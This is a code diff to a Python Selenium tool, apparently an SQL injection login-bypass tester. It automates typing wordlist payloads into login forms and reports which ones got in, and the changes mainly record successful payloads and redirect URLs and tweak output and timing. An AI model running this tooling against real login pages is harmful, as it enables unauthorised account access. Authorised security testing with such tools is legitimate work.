@@ -70,7 +70,7 @@ class SQLInjector:
                 service = Service('./geckodriver')
                 self.driver = webdriver.Firefox(service=service, options=options)  
                 self.driver.set_page_load_timeout(10)
-                self.driver.set_window_size(800, 600)  # Adjust size
+                self.driver.set_window_size(800, 600)  
                 self.driver.set_window_position(self.driver.execute_script("return window.screen.availWidth;") - 800, 44)  
             except Exception as e:
                 print(R+"[+] Error      -------------|- "+W+Y+ f"An error of type {type(e).__name__}"+W)  
@@ -87,6 +87,8 @@ class SQLInjector:
         except KeyboardInterrupt:
                   exit()        
     def test_sql_injection(self):
+        url_list = []
+        payload_list = []
         if self.args.wordlist:
             list_command  = open(self.args.wordlist,'r')   
             list_command  = list_command.readlines()       
@@ -138,27 +140,33 @@ class SQLInjector:
                     user_field.send_keys(command)
                     pass_field.send_keys('password')      
                 pass_field.send_keys(Keys.RETURN)
-                time.sleep(.30)
+                time.sleep(1)
                 page_source = self.driver.page_source
                 if self.args.error and self.args.error in str(page_source) or ("Error"or "error") in page_source :
+                    print('\n\n')
                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
                     print(B+'[*]'+R+' Login Page  URL          : '+B, self.args.url+W )     
                     if self.args.error:
                         print(B+'[*]'+R+' Status                   : '+Y+self.args.error+W)
                     else:               
                         print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
-                    for _ in range(4):
+                    for _ in range(7):
                         sys.stdout.write('\x1b[1A')
-                        sys.stdout.write('\x1b[2K')  
-                      
+                        sys.stdout.write('\x1b[2K')    
                 else:
                     if self.args.Continue:
                         if self.args.username:
                             print(R+"|  "+Y+f"{self.args.username:<23}",R+"|"+P+f"{     command   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
+                            url_list.append(self.driver.current_url)
+                            payload_list.append(command)
                         elif self.args.password:
-                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{     self.args.password   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")  
+                            print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{     self.args.password   :<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
+                            url_list.append(self.driver.current_url)
+                            payload_list.append(command)  
                         elif not  self.args.username and not self.args.password:  
                             print(R+"|  "+Y+f"{command:<23}",R+"| "+P+f"{'   password    ':<23}"+R+" | "+B+f"{' login ':<12}",R+"|",f'{str(self.driver.current_url):<80}',"|")
+                            url_list.append(self.driver.current_url)
+                            payload_list.append(command)
                     elif not self.args.Continue  : 
                         print(O+'='*30+'\n')     
                         print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
@@ -180,20 +188,28 @@ class SQLInjector:
             except KeyboardInterrupt:
                   exit()  
         if self.args.Continue:
-            print(O+'='*30+'\n')     
-            print(B+'[*] '+'Login URL  : '+R,  str(self.driver.current_url))
+            print(O+'='*30+'\n') 
             print(B+'[*] '+'SLQ Injaction Successful  Login \n')
+
+            for url in set(url_list):
+               print(B+'[*] '+'Redirections  : '+R,  url+"\n")
             print(O+'='*30+'\n\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n\n'+W)
             if self.args.username:
-                print(B+'[+] '+R+'username : '+Y+f'{self.args.username}')
-                print(B+'[+] '+R+'Password : '+Y+f'{command}')
+                print(B+'[+] '+R+'username : '+P+f'{self.args.username}')
+                print(B+'[+] '+R+'Password : '+O+f'{payload_list[0]}')
+                for C in payload_list:
+                    print(B+'             '+R+': '+O+f'{C}')
             elif self.args.password:
-                print(B+'[+] '+R+'username : '+Y+f'{command}')
-                print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')
+                print(B+'[+] '+R+'username : '+O+f'{payload_list[0]}')
+                for C in payload_list:
+                    print(B+'             '+R+': '+O+f'{C}')  
+                print(B+'[+] '+R+'Password : '+P+ f'{self.args.password}')      
             elif not  self.args.username and not self.args.password:
-                print(B+'[+] '+R+'username : '+Y+f'{command}')
-                print(B+'[+] '+R+'Password : '+Y+ 'password') 
-         
+                print(B+'[+] '+R+'username : '+O+f'{payload_list[0]}')
+                for C in payload_list:
+                    print(B+'             '+R+': '+O+f'{C}')
+                print(B+'[+] '+R+'Password : '+P+ 'password') 
+            exit()
         print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
         print(B+'[*] '+R+'Saugger To Use anther list Command '+W) 
         self.driver.quit()
@@ -250,7 +266,9 @@ class SQLInjector:
               time.sleep(0.20)  
         if self.args.time:
               print("[+] Sleep duration     --------------|- " +  self.args.time )
-              time.sleep(0.20)                 
+              time.sleep(0.20)        
+        print("[+] Length Page        --------------|- " +  str(self.page_len) )
+        time.sleep(0.20)                     
         print()
     def setup_args(self):
         parser = argparse.ArgumentParser(description="SQL Injection Tester with Selenium")
